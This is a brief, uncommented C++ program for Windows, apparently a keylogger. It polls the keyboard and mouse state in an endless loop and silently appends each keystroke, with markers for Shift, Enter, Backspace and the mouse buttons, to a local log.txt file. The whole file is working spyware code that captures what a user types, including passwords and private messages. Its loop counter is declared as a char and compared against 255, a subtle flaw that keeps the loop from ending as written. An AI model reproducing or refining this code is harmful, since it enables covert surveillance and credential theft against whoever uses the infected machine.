#include<iostream>
#include<fstream>
#include<string.h>
#include<windows.h>
using namespace std;
int main()
{
	 char i1; int key; 
    	while(1){
	for(i1=8;i1<255;i1++)
	{
		if(GetAsyncKeyState(i1)==-32767)
		{ fstream o("log.txt",ios::out|ios::app);
			key=i1;
			if(key==VK_SHIFT){ o<<" [SHIFT] "; }
			else if(key==VK_LBUTTON){ o<<" [L MOUSE]"; }
			else if(key==VK_RBUTTON){ o<<" [R MOUSE] ";	}
			else if(key==VK_BACK){ o<<" [BACK] "; }
			else if(key==VK_CAPITAL){o<<" [CAPS]";}
			else if(key==VK_RETURN){o<<" [ENTER] ";}
			else if(key==VK_ESCAPE){ o<<" [ESCAPE] "; }
			else{ o<<i1; }
			o.close();
		}
	}
}
  
}
	

	
